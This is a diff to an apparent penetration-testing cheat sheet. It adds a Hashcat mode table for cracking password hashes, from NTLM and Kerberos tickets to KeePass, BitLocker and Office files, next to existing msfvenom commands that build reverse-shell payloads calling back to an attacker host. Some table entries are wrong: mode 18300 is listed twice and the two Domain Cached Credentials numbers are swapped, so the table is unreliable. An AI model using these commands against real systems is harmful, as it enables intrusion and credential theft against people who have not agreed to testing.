@@ -320,6 +320,43 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f raw -o shel
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.elf
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.elf
 
+[*] Cracking
++---------- Hashcat ----------+
+0 	MD5
+100	SHA1
+1400	SHA256
+1700	SHA512
+500 	md5crypt
+1800 	sha512crypt
+7400 	sha256crypt
+1500 	descrypt
+3200 	bcrypt
+1000 	NTLM
+3000 	LM
+5500 	NetNTLMv1
+5600 	NetNTLMv2
+400     phpass (WordPress, Joomla, phpBB)
+18200	Kerberos 5 TGS-REP etype 17
+18300	Kerberos 5 TGS-REP etype 18
+13100 	Kerberos 5 TGS-REP etype 23
+7500 	Kerberos 5 AS-REQ Pre-Auth etype 23
+15300 	DPAPI masterkey
+15900 	DPAPI domain backupkey
+2100	Domain Cached Credentials (DCC)
+1100	Domain Cached Credentials 2 (DCC2)
+11300	MSSQL 2012+
+13200	AxCrypt
+13400 	KeePass
+12500 	RAR3-hp
+13000 	RAR5
+13600 	WinZip
+17220 	7-Zip
+18300 	BitLocker
+13711 	VeraCrypt
+9400	MS Office 2007
+9500	MS Office 2010
+9600	MS Office 2013
+
 [*] (21) FTP
 wget -m -q --no-parent --cut-dirs=1 --no-directories -P ftp ftp://$TARGET
 
